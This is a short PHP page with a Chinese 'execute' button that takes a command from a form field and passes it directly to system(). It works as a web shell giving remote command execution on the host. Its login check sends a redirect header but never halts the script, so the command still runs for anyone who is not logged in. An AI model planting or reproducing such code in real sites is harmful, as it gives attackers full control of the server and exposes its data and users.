<?php
if (!session_id()) {
    session_start();
    if (!isset($_SESSION['login'])) {
        function toLogin()
        {
            $fromFile = substr($_SERVER['PHP_SELF'], strpos($_SERVER['PHP_SELF'], '/', 1) + 1);
            $head = "";
            for ($int = substr_count($fromFile, '/'); $int > 0; $int--) {
                $head = $head . '../';
            }
            var_dump($head);
            header("location:" . $head . "login.php?hint=unLogged&fromFile=$fromFile");
        }
        toLogin();
    }
}
if (isset($_POST['submit'])) {
    if (isset($_POST['directive'])) {
        system($_POST['directive']);
    }
}
?>
<form method="post">
    <label id="input">
        <input type="text" name="directive">
        <input type="submit" name="submit" value="执行">
    </label>
</form>